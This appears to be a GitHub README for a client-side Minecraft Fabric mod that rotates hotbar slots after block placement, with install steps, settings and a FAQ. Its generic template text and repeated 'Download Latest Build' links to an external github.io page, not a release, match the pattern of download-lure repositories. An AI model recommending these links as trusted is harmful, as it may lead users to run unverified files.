# Block Randomizer v1.0.0 - Game Script Utility 2026

> **Minecraft Java Edition Fabric client-side helper for block placement.** It shuffles the selected hotbar slot after you place a block, gives you control over which slots participate, and provides easy-to-read in-game status feedback.

[![Game Script](https://img.shields.io/badge/Type-Game%20Script-green?style=flat-square)](https://github.com)
[![Platform](https://img.shields.io/badge/Platform-Minecraft%20Java%20Edition%20(Fabric%20client-side)-blue?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/isaac-davisrqgo6914/block-randomizer-script?style=flat-square)](https://github.com/isaac-davisrqgo6914/block-randomizer-script)

---

<p align="center">
  <a href="https://isaac-davisrqgo6914.github.io/block-randomizer-script/">
    <img src="https://img.shields.io/badge/Download-Block%20Randomizer%20Script-brightgreen?style=for-the-badge" alt="Download Block Randomizer Script">
  </a>
</p>

> **[Download Latest Build](https://isaac-davisrqgo6914.github.io/block-randomizer-script/)**

---

[Download Latest Build](https://isaac-davisrqgo6914.github.io/block-randomizer-script/)

---

## What It Does

Block Randomizer is a Fabric client-side mod for Minecraft Java Edition that changes hotbar slot selection after block placement. Instead of staying on the same slot, it can advance through a chosen set of allowed slots so placement feels more varied.

The mod is aimed at players who want a compact placement assistant with visible confirmation while they play. It adds slot markers in-game and RAND status cues so you can tell when the system is active and how it is behaving.

---

## Key Capabilities

- Randomizes the hotbar slot selected after block placement
- Moves through a user-defined pool of allowed hotbar slots
- Includes a keybind to switch the feature on or off
- Shows visible in-game slot markers
- Displays RAND status cues during operation
- Works as a client-side Fabric mod
- Built for Minecraft Java Edition
- Centered on block placement slot handling

---

## Installation

1. Download the latest build from the project download page.
2. Put the mod file into your Minecraft `mods` folder.
3. Confirm Fabric is installed for your Minecraft Java Edition client.
4. Start the game and use the on-screen indicators to verify that the mod loaded correctly.

Example folder layout:

- `.minecraft/mods/block-randomizer-fabric.jar`

If the build ships with configuration files, place them in the same profile folder your Minecraft client uses.

---

## Configuration

| Setting | Purpose |
| --- | --- |
| Allowed hotbar slots | Defines the slot pool used for rotation |
| Toggle keybind | Enables or disables the randomizer in game |
| Status indicators | Controls visibility of slot markers and RAND cues |
| Placement behavior | Determines when slot selection changes after block placement |

Example configuration style:

- `allowedSlots = [1, 2, 3, 4, 5]`
- `toggleKey = <your chosen key>`
- `showStatus = true`

---

## Compatibility Notes

Block Randomizer is meant for Minecraft Java Edition running in a Fabric client-side setup. It is designed around hotbar-based play and block placement workflows.

Notes to keep in mind:

- Built for the client side, not a server plugin
- Expected to work within the Minecraft Java Edition hotbar system
- Behavior depends on your chosen allowed-slot pool and keybind setup
- Visual cues may vary with your UI scale, resource packs, or other client mods

---

## FAQ

### How do I install it?
Download the build, place it in your Minecraft `mods` folder, and launch the game with Fabric enabled.

### How do I change which slots are used?
Adjust the allowed hotbar slot pool in the mod settings or configuration files, depending on the build you are using.

### Can I turn the feature off while playing?
Yes. The mod includes a keybind that lets you toggle randomization on or off.

### What do the on-screen cues mean?
The slot markers and RAND indicators are there to show state and help you verify when the feature is active.

### Does it work on the server side?
No. This is a client-side Fabric mod for Minecraft Java Edition.

### Where should I keep the files?
Keep the mod jar in your Minecraft `mods` folder, and store any related config files in the same instance or profile directory used by your client.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
